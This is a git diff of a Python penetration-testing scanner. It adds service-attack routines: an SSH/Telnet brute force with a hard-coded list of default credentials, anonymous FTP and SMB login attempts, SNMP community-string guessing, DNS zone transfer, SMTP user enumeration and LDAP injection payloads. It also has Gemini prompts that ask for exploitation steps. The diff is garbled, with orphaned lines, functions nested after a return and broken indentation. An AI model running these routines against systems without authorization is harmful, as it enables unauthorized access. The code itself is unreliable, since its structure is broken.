@@ -1542,20 +1542,7 @@ async def scan_nuclei(target, output, tech, report, session_cookies=None):
     except FileNotFoundError:
         output.print(f"  [ERROR] Nuclei not found. Please ensure Nuclei is installed and in your PATH.")
         return None
-    except Exception as e:
-        output.print(f"  [ERROR] An unexpected error occurred during Nuclei scan: {e}")
-        return None
-                    description = result.get('info', {}).get('description', 'No description provided.')
-                    template_id = result.get('template-id', 'N/A')
-                    matched_at = result.get('matched-at', target_url)
 
-                    output.print(f"  [INFO] Nuclei found: {vulnerability} (Severity: {severity}) at {matched_at}")
-                    report.add_finding(vulnerability, severity, matched_at, "N/A", template_id,
-                                       description,
-                                       "Review Nuclei's findings and apply appropriate patches or configuration changes.",
-                                       f"Nuclei Template ID: {template_id}\nMatched at: {matched_at}\nDescription: {description}")
-            except json.JSONDecodeError:
-                pass
         
         if not found_vulns:
             output.print("  [INFO] Nuclei found no obvious vulnerabilities with the enhanced template set.")
@@ -3975,745 +3962,376 @@ async def check_ldap_injection(target, form_to_test, output, tech, report, sessi
         *[f"mail=*{char}*@*" for char in string.ascii_lowercase],
     ]
 
-        ldap_errors = [
-
-            "ldap", "invalid filter", "illegal", "protocol error", "ldap exception",
-
-            "javax.naming.NameNotFoundException", "object does not exist",
-
-            "javax.naming.directory.InvalidSearchFilterException", "unrecognized attribute",
-
-            "ldap_search()", "ldap entry", "search filter is invalid"
-
-        ]
-
-    
-
-        # --- New functions for scan_exposed_services module ---
-
-    
-
-        def _ftp_anonymous_login(target, port, output_dir):
-
-            findings = []
-
-            print(f"{Fore.YELLOW}[*] Attempting anonymous FTP login on {target}:{port}{Style.RESET_ALL}")
-
-            try:
-
-                # Using subprocess for ftp command for simplicity and consistency
-
-                # This assumes 'ftp' client is available on the system
-
-                command = f"ftp -n {target} <<EOF\nuser anonymous anonymous\nls\nquit\nEOF"
-
-                stdout, stderr, error = run_command(command, f"Attempting anonymous FTP login on {target}:{port}")
-
-    
-
-                if "Login successful" in stdout or "230 Login successful" in stdout:
-
-                    findings.append(f"Anonymous FTP login successful on {target}:{port}. Listing files:\n{stdout}")
-
-                    save_output(output_dir, f"ftp_anonymous_login_{target}_{port}.txt", stdout)
-
-                elif "Login incorrect" in stdout or "530 Login incorrect" in stdout:
-
-                    findings.append(f"Anonymous FTP login failed on {target}:{port}.")
-
-                else:
-
-                    findings.append(f"FTP anonymous login attempt on {target}:{port} completed with unexpected output. Check logs.")
-
-                    save_output(output_dir, f"ftp_anonymous_login_raw_{target}_{port}.txt", stdout + stderr)
-
-    
-
-            except Exception as e:
-
-                findings.append(f"Error during anonymous FTP login on {target}:{port}: {e}")
-
-            return findings
-
-    
-
-        def _ssh_brute_force(target, port, output_dir):
-
-            findings = []
-
-            print(f"{Fore.YELLOW}[*] Attempting limited SSH brute-force on {target}:{port}{Style.RESET_ALL}")
-
-            common_credentials = [
-
-                ("root", "root"), ("admin", "admin"), ("test", "test"), ("ubuntu", "ubuntu"),
-
-                ("user", "user"), ("guest", "guest"), ("pi", "raspberry"), ("vagrant", "vagrant"),
-
-                ("administrator", "password"), ("admin", "password")
-
-            ]
-
-            
-
-            for username, password in common_credentials:
-
-                print(f"{Fore.CYAN}[*] Trying {username}:{password} on {target}:{port}{Style.RESET_ALL}")
-
-                # Using sshpass and ssh for simplicity. Requires sshpass to be installed.
-
-                command = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {username}@{target} -p {port} 'echo \"Login successful\"' 2>&1"
-
-                stdout, stderr, error = run_command(command, f"Attempting SSH login with {username}:{password} on {target}:{port}")
-
-    
-
-                if "Login successful" in stdout:
-
-                    findings.append(f"SSH login successful with credentials {username}:{password} on {target}:{port}.")
-
-                    save_output(output_dir, f"ssh_brute_force_success_{target}_{port}.txt", f"Credentials: {username}:{password}\nOutput:\n{stdout}")
-
-                    break # Stop on first success
-
-                elif "Permission denied" in stderr or "Authentication failed" in stderr:
-
-                    # Login failed, continue to next credential
-
-                    pass
-
-                else:
-
-                    findings.append(f"SSH login attempt with {username}:{password} on {target}:{port} completed with unexpected output. Check logs.")
-
-                    save_output(output_dir, f"ssh_brute_force_raw_{username}_{target}_{port}.txt", stdout + stderr)
-
-            
-
-            if not findings:
-
-                findings.append(f"Limited SSH brute-force failed to find valid credentials on {target}:{port}.")
-
-            return findings
-
-    
-
-        def _smb_anonymous_share(target, port, output_dir):
-
-            findings = []
-
-            print(f"{Fore.YELLOW}[*] Checking for anonymous SMB shares on {target}:{port}{Style.RESET_ALL}")
-
-            # Requires smbclient to be installed
-
-            command = f"smbclient -L //{target} -N -p {port}"
-
-            stdout, stderr, error = run_command(command, f"Checking anonymous SMB shares on {target}:{port}")
-
-    
-
-            if "Anonymous login successful" in stdout or "Disk" in stdout:
-
-                findings.append(f"Anonymous SMB login successful on {target}:{port}. Shares found:\n{stdout}")
-
-                save_output(output_dir, f"smb_anonymous_shares_{target}_{port}.txt", stdout)
-
-            elif "session setup failed" in stderr or "NT_STATUS_ACCESS_DENIED" in stderr:
-
-                findings.append(f"Anonymous SMB access denied on {target}:{port}.")
-
+    ldap_errors = [
+        "ldap", "invalid filter", "illegal", "protocol error", "ldap exception",
+        "javax.naming.NameNotFoundException", "object does not exist",
+        "javax.naming.directory.InvalidSearchFilterException", "unrecognized attribute",
+        "ldap_search()", "ldap entry", "search filter is invalid"
+    ]
+
+    # --- New functions for scan_exposed_services module ---
+
+    def _ftp_anonymous_login(target, port, output_dir):
+        findings = []
+        print(f"{Fore.YELLOW}[*] Attempting anonymous FTP login on {target}:{port}{Style.RESET_ALL}")
+        try:
+            # Using subprocess for ftp command for simplicity and consistency
+            # This assumes 'ftp' client is available on the system
+            command = f"ftp -n {target} <<EOF\nuser anonymous anonymous\nls\nquit\nEOF"
+            stdout, stderr, error = run_command(command, f"Attempting anonymous FTP login on {target}:{port}")
+
+            if "Login successful" in stdout or "230 Login successful" in stdout:
+                findings.append(f"Anonymous FTP login successful on {target}:{port}. Listing files:\n{stdout}")
+                save_output(output_dir, f"ftp_anonymous_login_{target}_{port}.txt", stdout)
+            elif "Login incorrect" in stdout or "530 Login incorrect" in stdout:
+                findings.append(f"Anonymous FTP login failed on {target}:{port}.")
             else:
-
-                findings.append(f"SMB anonymous share check on {target}:{port} completed with unexpected output. Check logs.")
-
-                save_output(output_dir, f"smb_anonymous_shares_raw_{target}_{port}.txt", stdout + stderr)
-
-            return findings
-
-    
-
-        def _snmp_community_string(target, port, output_dir):
-
-            findings = []
-
-            print(f"{Fore.YELLOW}[*] Checking common SNMP community strings on {target}:{port}{Style.RESET_ALL}")
-
-            common_community_strings = ["public", "private"]
-
-            
-
-            for community in common_community_strings:
-
-                print(f"{Fore.CYAN}[*] Trying SNMP community string '{community}' on {target}:{port}{Style.RESET_ALL}")
-
-                # Requires snmpwalk to be installed
-
-                command = f"snmpwalk -v 1 -c {community} {target}:{port} 1.3.6.1.2.1.1" # System MIB
-
-                stdout, stderr, error = run_command(command, f"Attempting SNMPwalk with community '{community}' on {target}:{port}")
-
-    
-
-                if "Timeout" not in stderr and "No Response" not in stderr and "Unknown host" not in stderr and stdout:
-
-                    findings.append(f"SNMP community string '{community}' successful on {target}:{port}. System info:\n{stdout}")
-
-                    save_output(output_dir, f"snmp_community_string_success_{community}_{target}_{port}.txt", stdout)
-
-                    break # Stop on first success
-
-                else:
-
-                    # No response or timeout, continue
-
-                    pass
-
-            
-
-            if not findings:
-
-                findings.append(f"Common SNMP community strings failed on {target}:{port}.")
-
-            return findings
-
-    
-
-        def _dns_zone_transfer(target, port, output_dir):
-
-            findings = []
-
-            print(f"{Fore.YELLOW}[*] Attempting DNS zone transfer on {target}:{port}{Style.RESET_ALL}")
-
-            
-
-            # Extract domain from target URL
-
-            try:
-
-                parsed_url = urlparse(target)
-
-                domain = parsed_url.netloc
-
-                if not domain:
-
-                    domain = target # Fallback if target is just a domain/IP
-
-                
-
-                # Remove port if present in domain
-
-                if ':' in domain:
-
-                    domain = domain.split(':')[0]
-
-    
-
-                if not domain:
-
-                    findings.append(f"Could not extract domain from target '{target}' for DNS zone transfer.")
-
-                    return findings
-
-    
-
-                # Requires 'dig' or 'host' to be installed
-
-                # Using dig for AXFR
-
-                command = f"dig @{target} {domain} axfr"
-
-                stdout, stderr, error = run_command(command, f"Attempting DNS zone transfer for {domain} via {target}:{port}")
-
-    
-
-                if "Transfer failed" not in stdout and "XFR size" in stdout and "ANSWER SECTION" in stdout:
-
-                    findings.append(f"DNS zone transfer successful for {domain} via {target}:{port}. Records:\n{stdout}")
-
-                    save_output(output_dir, f"dns_zone_transfer_success_{domain}_{target}_{port}.txt", stdout)
-
-                else:
-
-                    findings.append(f"DNS zone transfer failed or no records found for {domain} via {target}:{port}. Output:\n{stdout}\n{stderr}")
-
-                    save_output(output_dir, f"dns_zone_transfer_raw_{domain}_{target}_{port}.txt", stdout + stderr)
-
-    
-
-            except Exception as e:
-
-                findings.append(f"Error during DNS zone transfer on {target}:{port}: {e}")
-
-            return findings
-
-    
-
-        def _smtp_user_enumeration(target, port, output_dir):
-
-            findings = []
-
-            print(f"{Fore.YELLOW}[*] Attempting SMTP user enumeration on {target}:{port}{Style.RESET_ALL}")
-
-            common_users = ["root", "admin", "test", "info", "support", "postmaster"]
-
-    
-
-            try:
-
-                # Using nmap script for SMTP user enumeration for robustness
-
-                # Requires nmap to be installed with smtp-enum-users script
-
-                command = f"nmap -p {port} --script smtp-enum-users --script-args smtp-enum-users.users='{','.join(common_users)}' {target}"
-
-                stdout, stderr, error = run_command(command, f"Attempting SMTP user enumeration on {target}:{port}")
-
-    
-
-                if "User found" in stdout or "Valid user" in stdout:
-
-                    findings.append(f"SMTP user enumeration successful on {target}:{port}. Found users:\n{stdout}")
-
-                    save_output(output_dir, f"smtp_user_enumeration_success_{target}_{port}.txt", stdout)
-
-                else:
-
-                    findings.append(f"SMTP user enumeration on {target}:{port} completed. No common users found or unexpected output. Output:\n{stdout}\n{stderr}")
-
-                    save_output(output_dir, f"smtp_user_enumeration_raw_{target}_{port}.txt", stdout + stderr)
-
-    
-
-            except Exception as e:
-
-                findings.append(f"Error during SMTP user enumeration on {target}:{port}: {e}")
-
-            return findings
-
-    
-
-    
-
-            def scan_exposed_services(target, output_dir, nmap_output_file, report): # Added report
-
-    
-
-    
-
-                print(f"{Fore.MAGENTA}[+] Starting Exposed Services Scan for {target}{Style.RESET_ALL}")
-
-    
-
-    
-
-                exposed_services_findings = []
-
-    
-
-    
-
-                
-
-    
-
-    
-
-                try:
-
-    
-
-    
-
-                    with open(nmap_output_file, 'r') as f:
-
-    
-
-    
-
-                        nmap_content = f.read()
-
-    
-
-    
-
+                findings.append(f"FTP anonymous login attempt on {target}:{port} completed with unexpected output. Check logs.")
+                save_output(output_dir, f"ftp_anonymous_login_raw_{target}_{port}.txt", stdout + stderr)
+
+        except Exception as e:
+            findings.append(f"Error during anonymous FTP login on {target}:{port}: {e}")
+        return findings
+
+    def _ssh_brute_force(target, port, output_dir):
+        findings = []
+        print(f"{Fore.YELLOW}[*] Attempting limited SSH brute-force on {target}:{port}{Style.RESET_ALL}")
+        common_credentials = [
+            ("root", "root"), ("admin", "admin"), ("test", "test"), ("ubuntu", "ubuntu"),
+            ("user", "user"), ("guest", "guest"), ("pi", "raspberry"), ("vagrant", "vagrant"),
+            ("administrator", "password"), ("admin", "password")
+        ]
         
+        for username, password in common_credentials:
+            print(f"{Fore.CYAN}[*] Trying {username}:{password} on {target}:{port}{Style.RESET_ALL}")
+            # Using sshpass and ssh for simplicity. Requires sshpass to be installed.
+            command = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {username}@{target} -p {port} 'echo \"Login successful\"' 2>&1"
+            stdout, stderr, error = run_command(command, f"Attempting SSH login with {username}:{password} on {target}:{port}")
+
+            if "Login successful" in stdout:
+                findings.append(f"SSH login successful with credentials {username}:{password} on {target}:{port}.")
+                save_output(output_dir, f"ssh_brute_force_success_{target}_{port}.txt", f"Credentials: {username}:{password}\nOutput:\n{stdout}")
+                break # Stop on first success
+            elif "Permission denied" in stderr or "Authentication failed" in stderr:
+                # Login failed, continue to next credential
+                pass
+            else:
+                findings.append(f"SSH login attempt with {username}:{password} on {target}:{port} completed with unexpected output. Check logs.")
+                save_output(output_dir, f"ssh_brute_force_raw_{username}_{target}_{port}.txt", stdout + stderr)
+        
+        if not findings:
+            findings.append(f"Limited SSH brute-force failed to find valid credentials on {target}:{port}.")
+        return findings
+
+    def _smb_anonymous_share(target, port, output_dir):
+        findings = []
+        print(f"{Fore.YELLOW}[*] Checking for anonymous SMB shares on {target}:{port}{Style.RESET_ALL}")
+        # Requires smbclient to be installed
+        command = f"smbclient -L //{target} -N -p {port}"
+        stdout, stderr, error = run_command(command, f"Checking anonymous SMB shares on {target}:{port}")
+
+        if "Anonymous login successful" in stdout or "Disk" in stdout:
+            findings.append(f"Anonymous SMB login successful on {target}:{port}. Shares found:\n{stdout}")
+            save_output(output_dir, f"smb_anonymous_shares_{target}_{port}.txt", stdout)
+        elif "session setup failed" in stderr or "NT_STATUS_ACCESS_DENIED" in stderr:
+            findings.append(f"Anonymous SMB access denied on {target}:{port}.")
+        else:
+            findings.append(f"SMB anonymous share check on {target}:{port} completed with unexpected output. Check logs.")
+            save_output(output_dir, f"smb_anonymous_shares_raw_{target}_{port}.txt", stdout + stderr)
+        return findings
+
+    def _snmp_community_string(target, port, output_dir):
+        findings = []
+        print(f"{Fore.YELLOW}[*] Checking common SNMP community strings on {target}:{port}{Style.RESET_ALL}")
+        common_community_strings = ["public", "private"]
+        
+        for community in common_community_strings:
+            print(f"{Fore.CYAN}[*] Trying SNMP community string '{community}' on {target}:{port}{Style.RESET_ALL}")
+            # Requires snmpwalk to be installed
+            command = f"snmpwalk -v 1 -c {community} {target}:{port} 1.3.6.1.2.1.1" # System MIB
+            stdout, stderr, error = run_command(command, f"Attempting SNMPwalk with community '{community}' on {target}:{port}")
+
+            if "Timeout" not in stderr and "No Response" not in stderr and "Unknown host" not in stderr and stdout:
+                findings.append(f"SNMP community string '{community}' successful on {target}:{port}. System info:\n{stdout}")
+                save_output(output_dir, f"snmp_community_string_success_{community}_{target}_{port}.txt", stdout)
+                break # Stop on first success
+            else:
+                # No response or timeout, continue
+                pass
+        
+        if not findings:
+            findings.append(f"Common SNMP community strings failed on {target}:{port}.")
+        return findings
+
+    def _dns_zone_transfer(target, port, output_dir):
+        findings = []
+        print(f"{Fore.YELLOW}[*] Attempting DNS zone transfer on {target}:{port}{Style.RESET_ALL}")
+        
+        # Extract domain from target URL
+        try:
+            parsed_url = urlparse(target)
+            domain = parsed_url.netloc
+            if not domain:
+                domain = target # Fallback if target is just a domain/IP
+            
+            # Remove port if present in domain
+            if ':' in domain:
+                domain = domain.split(':')[0]
+
+            if not domain:
+                findings.append(f"Could not extract domain from target '{target}' for DNS zone transfer.")
+                return findings
+
+            # Requires 'dig' or 'host' to be installed
+            # Using dig for AXFR
+            command = f"dig @{target} {domain} axfr"
+            stdout, stderr, error = run_command(command, f"Attempting DNS zone transfer for {domain} via {target}:{port}")
+
+            if "Transfer failed" not in stdout and "XFR size" in stdout and "ANSWER SECTION" in stdout:
+                findings.append(f"DNS zone transfer successful for {domain} via {target}:{port}. Records:\n{stdout}")
+                save_output(output_dir, f"dns_zone_transfer_success_{domain}_{target}_{port}.txt", stdout)
+            else:
+                findings.append(f"DNS zone transfer failed or no records found for {domain} via {target}:{port}. Output:\n{stdout}\n{stderr}")
+                save_output(output_dir, f"dns_zone_transfer_raw_{domain}_{target}_{port}.txt", stdout + stderr)
+
+        except Exception as e:
+            findings.append(f"Error during DNS zone transfer on {target}:{port}: {e}")
+        return findings
+
+    def _smtp_user_enumeration(target, port, output_dir):
+        findings = []
+        print(f"{Fore.YELLOW}[*] Attempting SMTP user enumeration on {target}:{port}{Style.RESET_ALL}")
+        common_users = ["root", "admin", "test", "info", "support", "postmaster"]
+
+        try:
+            # Using nmap script for SMTP user enumeration for robustness
+            # Requires nmap to be installed with smtp-enum-users script
+            command = f"nmap -p {port} --script smtp-enum-users --script-args smtp-enum-users.users='{','.join(common_users)}' {target}"
+            stdout, stderr, error = run_command(command, f"Attempting SMTP user enumeration on {target}:{port}")
+
+            if "User found" in stdout or "Valid user" in stdout:
+                findings.append(f"SMTP user enumeration successful on {target}:{port}. Found users:\n{stdout}")
+                save_output(output_dir, f"smtp_user_enumeration_success_{target}_{port}.txt", stdout)
+            else:
+                findings.append(f"SMTP user enumeration on {target}:{port} completed. No common users found or unexpected output. Output:\n{stdout}\n{stderr}")
+                save_output(output_dir, f"smtp_user_enumeration_raw_{target}_{port}.txt", stdout + stderr)
+
+        except Exception as e:
+            findings.append(f"Error during SMTP user enumeration on {target}:{port}: {e}")
+        return findings
+
+
+        def scan_exposed_services(target, output_dir, nmap_output_file, report): # Added report
+
+
+            print(f"{Fore.MAGENTA}[+] Starting Exposed Services Scan for {target}{Style.RESET_ALL}")
+
+
+            exposed_services_findings = []
+
+
+            
+
+
+            try:
+
+
+                with open(nmap_output_file, 'r') as f:
+
+
+                    nmap_content = f.read()
+
 
     
 
+
+                service_pattern = re.compile(r"(\d+)/(tcp|udp)\s+open\s+(\S+)")
+
+
+                
+
+
+                services_to_attack = []
+
+
+                for line in nmap_content.splitlines():
+
+
+                    match = service_pattern.search(line)
+
+
+                    if match:
+
+
+                        port = int(match.group(1))
+
+
+                        protocol = match.group(2)
+
+
+                        service = match.group(3)
+
+
+                        services_to_attack.append({'port': port, 'protocol': protocol, 'service': service})
+
+
     
 
-                    service_pattern = re.compile(r"(\d+)/(tcp|udp)\s+open\s+(\S+)")
+
+                if not services_to_attack:
+
+
+                    finding_description = "No relevant open services found in Nmap output for exposed services scan."
+
+
+                    exposed_services_findings.append(finding_description)
+
+
+                    report.add_finding("Exposed Service Vulnerability", "Info", target, "N/A", "N/A", finding_description, "N/A", "N/A")
+
+
+                    print(f"{Fore.YELLOW}[-] No relevant open services found for exposed services scan.{Style.RESET_ALL}")
+
+
+                    return exposed_services_findings
+
 
     
 
+
+                for service_info in services_to_attack:
+
+
+                    port = service_info['port']
+
+
+                    service_name = service_info['service']
+
+
+                    protocol = service_info['protocol']
+
+
     
+
+
+                    current_service_findings = []
+
+
+    
+
+
+                    if service_name == 'ftp' and port == 21:
+
+
+                        current_service_findings.extend(_ftp_anonymous_login(target, port, output_dir))
+
+
+                    elif service_name == 'ssh' and port == 22:
+
+
+                        current_service_findings.extend(_ssh_brute_force(target, port, output_dir))
+
+
+                    elif service_name == 'telnet' and port == 23:
+
+
+                        current_service_findings.extend(_ssh_brute_force(target, port, output_dir)) # Re-using SSH brute-force for Telnet
+
+
+                    elif service_name == 'ms-wbt-server' and port == 3389: # RDP
+
+
+                        current_service_findings.append(f"RDP service detected on {target}:{port}. Manual brute-force recommended.")
+
+
+                    elif service_name == 'netbios-ssn' and port == 139 or service_name == 'microsoft-ds' and port == 445: # SMB
+
+
+                        current_service_findings.extend(_smb_anonymous_share(target, port, output_dir))
+
+
+                    elif service_name == 'snmp' and port == 161 and protocol == 'udp':
+
+
+                        current_service_findings.extend(_snmp_community_string(target, port, output_dir))
+
+
+                    elif service_name == 'domain' and port == 53: # DNS
+
+
+                        current_service_findings.extend(_dns_zone_transfer(target, port, output_dir))
+
+
+                    elif service_name == 'smtp' and port == 25:
+
+
+                        current_service_findings.extend(_smtp_user_enumeration(target, port, output_dir))
+
+
+                    else:
+
+
+                        print(f"{Fore.BLUE}[*] Skipping service {service_name} on {target}:{port} for exposed services scan (not in scope or already covered).{Style.RESET_ALL}")
+
 
                     
 
-    
-
-    
-
-                    services_to_attack = []
-
-    
-
-    
-
-                    for line in nmap_content.splitlines():
-
-    
-
-    
-
-                        match = service_pattern.search(line)
-
-    
-
-    
-
-                        if match:
-
-    
-
-    
-
-                            port = int(match.group(1))
-
-    
-
-    
-
-                            protocol = match.group(2)
-
-    
-
-    
-
-                            service = match.group(3)
-
-    
-
-    
-
-                            services_to_attack.append({'port': port, 'protocol': protocol, 'service': service})
-
-    
-
-    
-
-        
-
-    
-
-    
-
-                    if not services_to_attack:
-
-    
-
-    
-
-                        finding_description = "No relevant open services found in Nmap output for exposed services scan."
-
-    
-
-    
-
-                        exposed_services_findings.append(finding_description)
-
-    
-
-    
-
-                        report.add_finding("Exposed Service Vulnerability", "Info", target, "N/A", "N/A", finding_description, "N/A", "N/A")
-
-    
-
-    
-
-                        print(f"{Fore.YELLOW}[-] No relevant open services found for exposed services scan.{Style.RESET_ALL}")
-
-    
-
-    
-
-                        return exposed_services_findings
-
-    
-
-    
-
-        
-
-    
-
-    
-
-                    for service_info in services_to_attack:
-
-    
-
-    
-
-                        port = service_info['port']
-
-    
-
-    
-
-                        service_name = service_info['service']
-
-    
-
-    
-
-                        protocol = service_info['protocol']
-
-    
-
-    
-
-        
-
-    
-
-    
-
-                        current_service_findings = []
-
-    
-
-    
-
-        
-
-    
-
-    
-
-                        if service_name == 'ftp' and port == 21:
-
-    
-
-    
-
-                            current_service_findings.extend(_ftp_anonymous_login(target, port, output_dir))
-
-    
-
-    
-
-                        elif service_name == 'ssh' and port == 22:
-
-    
-
-    
-
-                            current_service_findings.extend(_ssh_brute_force(target, port, output_dir))
-
-    
-
-    
-
-                        elif service_name == 'telnet' and port == 23:
-
-    
-
-    
-
-                            current_service_findings.extend(_ssh_brute_force(target, port, output_dir)) # Re-using SSH brute-force for Telnet
-
-    
-
-    
-
-                        elif service_name == 'ms-wbt-server' and port == 3389: # RDP
-
-    
-
-    
-
-                            current_service_findings.append(f"RDP service detected on {target}:{port}. Manual brute-force recommended.")
-
-    
-
-    
-
-                        elif service_name == 'netbios-ssn' and port == 139 or service_name == 'microsoft-ds' and port == 445: # SMB
-
-    
-
-    
-
-                            current_service_findings.extend(_smb_anonymous_share(target, port, output_dir))
-
-    
-
-    
-
-                        elif service_name == 'snmp' and port == 161 and protocol == 'udp':
-
-    
-
-    
-
-                            current_service_findings.extend(_snmp_community_string(target, port, output_dir))
-
-    
-
-    
-
-                        elif service_name == 'domain' and port == 53: # DNS
-
-    
-
-    
-
-                            current_service_findings.extend(_dns_zone_transfer(target, port, output_dir))
-
-    
-
-    
-
-                        elif service_name == 'smtp' and port == 25:
-
-    
-
-    
-
-                            current_service_findings.extend(_smtp_user_enumeration(target, port, output_dir))
-
-    
-
-    
 
-                        else:
+                    for finding in current_service_findings:
 
-    
-
-    
-
-                            print(f"{Fore.BLUE}[*] Skipping service {service_name} on {target}:{port} for exposed services scan (not in scope or already covered).{Style.RESET_ALL}")
-
-    
-
-    
-
-                        
-
-    
-
-    
-
-                        for finding in current_service_findings:
-
-    
-
-    
-
-                            exposed_services_findings.append(finding)
-
-    
-
-    
-
-                            # Add each finding to the report
-
-    
-
-    
-
-                            report.add_finding("Exposed Service Vulnerability", "Medium", target, f"Port {port}/{protocol} ({service_name})", "N/A", finding, "Review service configuration and apply security best practices.", finding)
-
-    
-
-    
 
-        
+                        exposed_services_findings.append(finding)
 
-    
-
-    
-
-        
-
-    
-
-    
 
-                except FileNotFoundError:
+                        # Add each finding to the report
 
-    
-
-    
-
-                    finding_description = f"Nmap output file not found at {nmap_output_file}. Cannot perform exposed services scan."
-
-    
-
-    
 
-                    exposed_services_findings.append(finding_description)
+                        report.add_finding("Exposed Service Vulnerability", "Medium", target, f"Port {port}/{protocol} ({service_name})", "N/A", finding, "Review service configuration and apply security best practices.", finding)
 
-    
 
     
 
-                    report.add_finding("Exposed Service Vulnerability", "Error", target, "N/A", "N/A", finding_description, "Ensure Nmap scan completes successfully.", "N/A")
 
     
 
-    
 
-                    print(f"{Fore.RED}[-] Nmap output file not found. Cannot perform exposed services scan.{Style.RESET_ALL}")
+            except FileNotFoundError:
 
-    
 
-    
+                finding_description = f"Nmap output file not found at {nmap_output_file}. Cannot perform exposed services scan."
 
-                except Exception as e:
 
-    
+                exposed_services_findings.append(finding_description)
 
-    
 
-                    finding_description = f"Error during exposed services scan: {e}"
+                report.add_finding("Exposed Service Vulnerability", "Error", target, "N/A", "N/A", finding_description, "Ensure Nmap scan completes successfully.", "N/A")
 
-    
 
-    
+                print(f"{Fore.RED}[-] Nmap output file not found. Cannot perform exposed services scan.{Style.RESET_ALL}")
 
-                    exposed_services_findings.append(finding_description)
 
-    
+            except Exception as e:
 
-    
 
-                    report.add_finding("Exposed Service Vulnerability", "Error", target, "N/A", "N/A", finding_description, "Review error logs.", str(e))
+                finding_description = f"Error during exposed services scan: {e}"
 
-    
 
-    
+                exposed_services_findings.append(finding_description)
 
-                    print(f"{Fore.RED}[-] Error during exposed services scan: {e}{Style.RESET_ALL}")
 
-    
+                report.add_finding("Exposed Service Vulnerability", "Error", target, "N/A", "N/A", finding_description, "Review error logs.", str(e))
 
-    
 
-        
+                print(f"{Fore.RED}[-] Error during exposed services scan: {e}{Style.RESET_ALL}")
 
-    
 
     
 
-                print(f"{Fore.MAGENTA}[+] Exposed Services Scan for {target} Finished.{Style.RESET_ALL}")
 
-    
+            print(f"{Fore.MAGENTA}[+] Exposed Services Scan for {target} Finished.{Style.RESET_ALL}")
 
-    
 
-                return exposed_services_findings
+            return exposed_services_findings
 
     
 
@@ -4742,14 +4360,10 @@ async def check_ldap_injection(target, form_to_test, output, tech, report, sessi
                 return ai_response
 
             except Exception as e:
-
                 print(f"{Fore.RED}[-] AI Assistant Error for Exposed Services: {e}{Style.RESET_ALL}")
+                return f"AI Assistant Error: {e}"
 
-                            return f"AI Assistant Error: {e}"
-
-                
-
-                    async def ai_assist_profile_target(target, output_dir, tech_info):
+        async def ai_assist_profile_target(target, output_dir, tech_info):
 
                         print(f"{Fore.CYAN}[*] AI Assistant analyzing technology profile for {target}...{Style.RESET_ALL}")
 
@@ -4779,592 +4393,307 @@ async def check_ldap_injection(target, form_to_test, output, tech, report, sessi
 
                             return f"AI Assistant Error: {e}"
 
+        async def ai_assist_nmap(target, output_dir, nmap_output_file):
+            print(f"{Fore.CYAN}[*] AI Assistant analyzing Nmap scan results for {target}...{Style.RESET_ALL}")
+            try:
+                with open(nmap_output_file, 'r') as f:
+                    nmap_content = f.read()
                 
-
-                    async def ai_assist_nmap(target, output_dir, nmap_output_file):
-
-                        print(f"{Fore.CYAN}[*] AI Assistant analyzing Nmap scan results for {target}...{Style.RESET_ALL}")
-
-                        try:
-
-                            with open(nmap_output_file, 'r') as f:
-
-                                nmap_content = f.read()
-
-                            
-
-                            prompt = f"Analyze the following Nmap scan results for target {target}. Identify open ports, services, and versions. Highlight any potentially vulnerable services or unusual configurations. Suggest immediate next steps for exploiting or further investigating these findings.\n\nNmap Scan Results:\n{nmap_content}"
-
-                            
-
-                            response = await GEMINI_MODEL.generate_content_async(prompt)
-
-                            ai_response = response.text
-
-                            print(f"{Fore.GREEN}[+] AI Assistant Analysis for Nmap Scan:\n{ai_response}{Style.RESET_ALL}")
-
-                            save_output(output_dir, "ai_nmap_analysis.txt", ai_response)
-
-                            return ai_response
-
-                        except FileNotFoundError:
-
-                            print(f"{Fore.RED}[-] Nmap output file not found for AI analysis: {nmap_output_file}{Style.RESET_ALL}")
-
-                            return "Nmap output file not found for AI analysis."
-
-                        except Exception as e:
-
-                            print(f"{Fore.RED}[-] AI Assistant Error for Nmap Scan: {e}{Style.RESET_ALL}")
-
-                            return f"AI Assistant Error: {e}"
-
+                prompt = f"Analyze the following Nmap scan results for target {target}. Identify open ports, services, and versions. Highlight any potentially vulnerable services or unusual configurations. Suggest immediate next steps for exploiting or further investigating these findings.\n\nNmap Scan Results:\n{nmap_content}"
                 
+                response = await GEMINI_MODEL.generate_content_async(prompt)
+                ai_response = response.text
+                print(f"{Fore.GREEN}[+] AI Assistant Analysis for Nmap Scan:\n{ai_response}{Style.RESET_ALL}")
+                save_output(output_dir, "ai_nmap_analysis.txt", ai_response)
+                return ai_response
+            except FileNotFoundError:
+                print(f"{Fore.RED}[-] Nmap output file not found for AI analysis: {nmap_output_file}{Style.RESET_ALL}")
+                return "Nmap output file not found for AI analysis."
+            except Exception as e:
+                print(f"{Fore.RED}[-] AI Assistant Error for Nmap Scan: {e}{Style.RESET_ALL}")
+                return f"AI Assistant Error: {e}"
 
-                    async def ai_assist_nikto(target, output_dir, nikto_output_file):
-
-                        print(f"{Fore.CYAN}[*] AI Assistant analyzing Nikto scan results for {target}...{Style.RESET_ALL}")
-
-                        try:
-
-                            with open(nikto_output_file, 'r') as f:
-
-                                nikto_content = f.read()
-
-                            
-
-                            prompt = f"Analyze the following Nikto scan results for target {target}. Summarize identified vulnerabilities, misconfigurations, and informational findings. Prioritize the most critical issues and suggest specific exploitation techniques or remediation actions.\n\nNikto Scan Results:\n{nikto_content}"
-
-                            
-
-                            response = await GEMINI_MODEL.generate_content_async(prompt)
-
-                            ai_response = response.text
-
-                            print(f"{Fore.GREEN}[+] AI Assistant Analysis for Nikto Scan:\n{ai_response}{Style.RESET_ALL}")
-
-                            save_output(output_dir, "ai_nikto_analysis.txt", ai_response)
-
-                            return ai_response
-
-                        except FileNotFoundError:
-
-                            print(f"{Fore.RED}[-] Nikto output file not found for AI analysis: {nikto_output_file}{Style.RESET_ALL}")
-
-                            return "Nikto output file not found for AI analysis."
-
-                        except Exception as e:
-
-                            print(f"{Fore.RED}[-] AI Assistant Error for Nikto Scan: {e}{Style.RESET_ALL}")
-
-                            return f"AI Assistant Error: {e}"
-
+        async def ai_assist_nikto(target, output_dir, nikto_output_file):
+            print(f"{Fore.CYAN}[*] AI Assistant analyzing Nikto scan results for {target}...{Style.RESET_ALL}")
+            try:
+                with open(nikto_output_file, 'r') as f:
+                    nikto_content = f.read()
                 
-
-                    async def ai_assist_nuclei(target, output_dir, nuclei_output_file):
-
